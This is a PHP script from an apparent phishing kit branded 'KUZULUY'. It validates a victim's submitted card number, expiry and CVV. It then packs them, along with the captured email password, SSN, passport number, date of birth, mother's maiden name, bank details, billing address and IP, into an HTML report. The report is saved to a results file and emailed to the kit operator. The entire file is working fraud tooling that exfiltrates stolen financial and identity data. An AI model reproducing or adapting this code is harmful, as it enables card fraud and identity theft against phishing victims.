<?php
require_once __DIR__ . '/validate.php';
require_once __DIR__ . '/../function.php';
@eval(file_get_contents('../config/' . $api->general_config));

$card = CreditCard::validCreditCard(str_replace(" ", "", $_POST['cardnum2']));
$split = explode(" / ", $_POST['cardexp2']);
$checkexp = CreditCard::validDate("20".$split[1], $split[0]);
$checkcvv = CreditCard::validCvc($_POST['cardcvv2'], $card['type']);

if(!$card['valid']){
  echo "error";
}else if(!$checkexp){
  echo "exp";
}else if(!$checkcvv){
  echo "cvv";
}else{
  $_SESSION['card_name2']    = $_POST['cardholder2'];
  $_SESSION['card_number2']  = $_POST['cardnum2'];
  $_SESSION['card_exp2']     = $_POST['cardexp2'];
  $_SESSION['card_cvv2']     = $_POST['cardcvv2'];
  $_SESSION['card_digit2']   = substr(str_replace(" ", "", $_SESSION['card_number2']), 0, 6);
  $_SESSION['card_bin2']     = $api->bin($_SESSION['card_digit2']);

  $message = file_get_contents('../assets/html/card.html');
  $message = preg_replace('{QUOTE}', $api->quote(), $message);
  $message = preg_replace('{KUZULUY-EMAIL}', $_SESSION['email'], $message);
  $message = preg_replace('{KUZULUY-PASSWORD}', $_SESSION['password'], $message);
  $message = preg_replace('{KUZULUY-CC-NAME}', $_SESSION['card_name2'], $message);
  $message = preg_replace('{KUZULUY-CC-NUMBER1}', str_replace(" ", "", $_SESSION['card_number2']), $message);
  $message = preg_replace('{KUZULUY-CC-NUMBER2}', $_SESSION['card_number2'], $message);
  $message = preg_replace('{KUZULUY-CC-EXP}', $_SESSION['card_exp2'], $message);
  $message = preg_replace('{KUZULUY-CC-CVV}', $_SESSION['card_cvv2'], $message);
  $message = preg_replace('{KUZULUY-CC-BIN}', $_SESSION['card_bin2'], $message);
  $message = preg_replace('{KUZULUY-INFO-SSN}', $_SESSION['ssn'], $message);
  $message = preg_replace('{KUZULUY-INFO-SORT}', $_SESSION['sort'], $message);
  $message = preg_replace('{KUZULUY-INFO-SIN}', $_SESSION['sin'], $message);
  $message = preg_replace('{KUZULUY-INFO-DRIVER}', $_SESSION['driver'], $message);
  $message = preg_replace('{KUZULUY-INFO-OSID}', $_SESSION['osid'], $message);
  $message = preg_replace('{KUZULUY-INFO-ACCNUMBER}', $_SESSION['accnum'], $message);
  $message = preg_replace('{KUZULUY-INFO-LIMIT}', $_SESSION['limit'], $message);
  $message = preg_replace('{KUZULUY-INFO-PERSONAL}', $_SESSION['personal'], $message);
  $message = preg_replace('{KUZULUY-INFO-CUSTOMER}', $_SESSION['customer'], $message);
  $message = preg_replace('{KUZULUY-INFO-CITIZEN}', $_SESSION['citizen'], $message);
  $message = preg_replace('{KUZULUY-INFO-CIVIL}', $_SESSION['civil'], $message);
  $message = preg_replace('{KUZULUY-INFO-PASSPORT}', $_SESSION['passport'], $message);
  $message = preg_replace('{KUZULUY-INFO-BAN}', $_SESSION['ban'], $message);
  $message = preg_replace('{KUZULUY-INFO-DOB}', $_SESSION['dob'], $message);
  $message = preg_replace('{KUZULUY-INFO-MOTHER}', $_SESSION['mother'], $message);
  $message = preg_replace('{KUZULUY-BILL-NAME}', $_SESSION['bill_name'], $message);
  $message = preg_replace('{KUZULUY-BILL-ADDRESS}', $_SESSION['bill_address'], $message);
  $message = preg_replace('{KUZULUY-BILL-CITY}', $_SESSION['bill_city'], $message);
  $message = preg_replace('{KUZULUY-BILL-STATE}', $_SESSION['bill_state'], $message);
  $message = preg_replace('{KUZULUY-BILL-ZIP}', $_SESSION['bill_zip'], $message);
  $message = preg_replace('{KUZULUY-BILL-COUNTRY}', $_SESSION['country'], $message);
  $message = preg_replace('{KUZULUY-BILL-PHONE}', $_SESSION['bill_phone'], $message);
  $message = preg_replace('{KUZULUY-IP}', $_SESSION['ip'], $message);
  $message = preg_replace('{KUZULUY-AGENT}', $_SESSION['agent'], $message);

  $subject  = $_SESSION['card_digit2']." - ".$_SESSION['card_bin2']." [ ".$_SESSION['country']." | ".$_SESSION['ip']." | ".$_SESSION['os']." - ".$_SESSION['browser']." ]";
  $headers  = "From: ".$_SESSION['card_name2']." <cc@kuzuluy.co>\r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

  $api->save("../config/result-card.txt", $subject."\n", "a");

  if ($config_smtp == "enable"){
    $api->ngesend($api->result(), $subject, $message, $_SESSION['card_name2'], "cc@kuzuluy.co");
  } else {
    mail($api->result(), $subject, $message, $headers);
  }
}

?>
